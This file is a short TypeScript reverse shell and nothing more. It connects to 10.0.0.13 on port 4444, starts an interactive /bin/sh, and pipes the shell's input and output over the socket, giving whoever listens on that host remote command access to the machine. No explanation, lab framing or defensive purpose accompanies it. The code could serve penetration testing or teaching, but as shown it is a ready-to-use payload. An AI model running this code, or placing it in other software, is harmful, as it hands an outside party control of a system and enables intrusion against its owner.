// TypeScript reverse shell
import * as net from "net";
import { spawn } from "child_process";

const sock: net.Socket = net.connect(4444, "10.0.0.13", (): void => {
    const sh = spawn("/bin/sh", ["-i"]);
    sock.pipe(sh.stdin);
    sh.stdout.pipe(sock);
    sh.stderr.pipe(sock);
});
